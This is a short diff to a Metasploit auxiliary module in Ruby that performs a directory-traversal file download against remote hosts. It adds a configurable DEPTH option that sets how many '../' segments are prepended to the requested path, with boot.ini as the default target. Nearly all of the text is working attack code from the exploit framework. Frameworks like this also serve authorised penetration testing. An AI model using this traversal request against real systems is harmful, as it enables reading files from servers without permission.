@@ -37,7 +37,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptString.new('FILEPATH', [true, 'The name of the file to download', 'boot.ini'])
+				OptString.new('FILEPATH', [true, 'The name of the file to download', 'boot.ini']),
+				OptInt.new('DEPTH',       [true, 'The max traversal depth', 8])
 			], self.class)
 
 		deregister_options('RHOST')
@@ -77,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run_host(ip)
-		uri = normalize_uri("../"*8, datastore['FILEPATH'])
+		uri = normalize_uri("../"*datastore['DEPTH'], datastore['FILEPATH'])
 		res = send_request_raw({'uri'=>uri})
 
 		if not res
